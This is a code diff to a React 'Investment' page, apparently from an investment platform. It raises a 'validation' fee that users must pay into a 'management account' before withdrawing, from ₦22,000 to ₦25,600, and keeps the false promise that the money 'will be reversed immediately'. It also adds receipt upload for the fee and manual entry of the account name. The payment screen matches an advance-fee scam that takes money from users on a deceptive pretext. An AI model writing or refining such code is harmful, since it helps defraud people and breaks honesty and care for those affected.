@@ -94,7 +94,6 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
     const accNum = withdrawalAccount.accountNumber;
     if (!bankCode || accNum.length !== 10) {
       if (accNum.length < 10) {
-        setWithdrawalAccount(prev => ({ ...prev, accountName: '' }));
         setVerificationError('');
       }
       return;
@@ -105,16 +104,11 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
       return; // Already verified this exact combination
     }
 
-    if (isVerifying) {
-      return; // Prevent duplicate concurrent verification requests
-    }
-
     let isMounted = true;
 
     const verifyAccount = async () => {
       setIsVerifying(true);
       setVerificationError('');
-      setWithdrawalAccount(prev => ({ ...prev, accountName: '' }));
       try {
         const response = await fetch('/api/verify-account', {
           method: 'POST',
@@ -133,20 +127,18 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
 
         const data = await response.json();
         if (isMounted) {
-          if (data.success) {
+          if (data.success && data.accountName) {
             setWithdrawalAccount(prev => ({ ...prev, accountName: data.accountName }));
             setLastVerifiedKey(currentKey);
             setVerificationError('');
           } else {
-            setVerificationError(data.error || 'Failed to verify account details');
-            setWithdrawalAccount(prev => ({ ...prev, accountName: '' }));
+            setVerificationError('Could not auto-verify account name. Please type your account name manually below.');
           }
         }
       } catch (err: any) {
         console.error('Account verification request error:', err);
         if (isMounted) {
-          setVerificationError('Network error during account verification. Please try again.');
-          setWithdrawalAccount(prev => ({ ...prev, accountName: '' }));
+          setVerificationError('Network issue during auto-verification. Please type your account name manually below.');
         }
       } finally {
         if (isMounted) {
@@ -285,9 +277,9 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
 
         <div className="bg-amber-500/10 p-5 rounded-2xl border border-amber-500/30">
           <p className="text-sm font-medium leading-relaxed text-amber-500">
-            To confirm your withdrawal account is valid, you need to pay <span className="font-black">₦22,000</span> into the management account. 
+            To confirm your withdrawal account is valid, you need to pay <span className="font-black">₦25,600</span> into the management account. 
             <br/><br/>
-            <span className="text-white font-bold">NOTE: This ₦22,000 will be reversed to your account immediately after payment is confirmed. It's just for account validation.</span>
+            <span className="text-white font-bold">NOTE: This ₦25,600 will be reversed to your account immediately after payment is confirmed. It's just for account validation.</span>
           </p>
         </div>
 
@@ -295,7 +287,7 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
           <div className="bg-gray-900 rounded-2xl p-6 shadow-xl border border-amber-500/30 space-y-4">
              <div className="flex justify-between items-center border-b border-gray-800 pb-2">
                 <span className="text-xs text-gray-500 uppercase font-bold">Amount</span>
-                <span className="text-lg font-black text-white">₦22,000</span>
+                <span className="text-lg font-black text-white">₦25,600</span>
               </div>
               <div className="flex justify-between items-center border-b border-gray-800 pb-2">
                 <span className="text-xs text-gray-500 uppercase font-bold">Account Number</span>
@@ -316,8 +308,6 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
               </div>
           </div>
         </div>
-
-
 
         {/* Payment Proof Upload */}
         <div className="space-y-3">
@@ -353,7 +343,7 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
               ) : (
                 <>
                   <Icons.Upload className="text-gray-500" size={24} />
-                  <span className="text-xs font-bold text-gray-500 uppercase">Click to Upload Receipt (₦22,000)</span>
+                  <span className="text-xs font-bold text-gray-500 uppercase">Click to Upload Receipt (₦25,600)</span>
                 </>
               )}
             </label>
@@ -385,7 +375,7 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
                 restrictionRestoreTime: restoreTime,
                 pendingActivation: 'investment',
                 pendingPaymentProof: investProof,
-                pendingPaymentAmount: 22000,
+                pendingPaymentAmount: 25600,
                 pendingPaymentDate: new Date().toISOString(),
                 lastUploadTimestamp: Date.now()
               });
@@ -456,9 +446,9 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
             <div className="relative">
               <input 
                 type="text" 
-                readOnly
-                placeholder={isVerifying ? "Verifying account details..." : "Account Name (automatically verified)"}
+                placeholder={isVerifying ? "Verifying account details..." : "Account Name"}
                 value={withdrawalAccount.accountName}
+                onChange={(e) => setWithdrawalAccount({ ...withdrawalAccount, accountName: e.target.value })}
                 className={`w-full bg-black border p-4 rounded-xl text-white outline-none transition-all font-bold text-sm ${
                   isVerifying 
                     ? 'border-amber-500/30 text-amber-300' 
@@ -474,8 +464,8 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
               )}
             </div>
             {verificationError && (
-              <p className="text-xs text-red-400 font-medium mt-1.5 pl-1">
-                ⚠️ {verificationError}
+              <p className="text-xs text-amber-400 font-medium mt-1.5 pl-1">
+                ℹ️ {verificationError}
               </p>
             )}
           </div>
@@ -483,9 +473,9 @@ const Investment: React.FC<InvestmentProps> = ({ user, onBack, onUpdateUser }) =
 
         <button 
           onClick={handleVerifyWithdrawalAccount}
-          disabled={isVerifying || !withdrawalAccount.accountName}
+          disabled={isVerifying || !withdrawalAccount.accountName.trim()}
           className={`w-full py-4 font-black rounded-xl uppercase tracking-widest text-lg shadow-xl active:scale-95 transition-all ${
-            isVerifying || !withdrawalAccount.accountName
+            isVerifying || !withdrawalAccount.accountName.trim()
               ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed shadow-none'
               : 'bg-amber-500 text-black'
           }`}
